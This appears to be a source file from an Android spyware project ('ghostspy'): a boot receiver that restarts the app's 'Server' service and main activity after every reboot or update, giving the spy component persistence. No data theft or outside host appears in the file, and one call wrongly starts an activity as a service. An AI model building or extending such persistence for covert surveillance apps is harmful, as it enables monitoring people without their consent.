package com.spy.ghostspy.receiver;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.spy.ghostspy.MainActivity;
import com.spy.ghostspy.server.Server;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) || Intent.ACTION_MY_PACKAGE_REPLACED.equals(intent.getAction())) {
            Log.d("BootReceiver", "Boot completed, starting MainActivity");
            Intent serviceIntentX = new Intent(context, Server.class);
            context.startService(serviceIntentX);

            Intent startServiceIntent = new Intent(context, MainActivity.class);
            startServiceIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
            context.startService(startServiceIntent);
        }
    }
}